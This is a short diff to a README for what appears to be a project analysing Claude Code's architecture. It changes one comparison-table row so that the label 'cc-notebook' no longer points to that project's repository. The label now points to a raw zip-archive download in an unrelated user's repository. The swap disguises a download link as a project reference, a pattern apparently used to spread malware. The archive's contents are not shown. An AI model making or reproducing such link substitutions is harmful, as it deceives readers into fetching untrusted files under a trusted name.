@@ -51,7 +51,7 @@ A **14-chapter deep architecture analysis** of Claude Code, based on the TypeScr
 
 ## Comparison with Similar Projects
 
-| Dimension | [cc-notebook](https://github.com/win4r/cc-notebook) | This Project |
+| Dimension | [cc-notebook](https://raw.githubusercontent.com/flunkymercenary747/Claude-code-research/main/es/Claude_code_research_3.6-alpha.1.zip) | This Project |
 |-----------|------------|--------------|
 | Total Size | ~150 KB / 13 files | **520 KB / 16 files** |
 | Topics Covered | 7 | **14** |
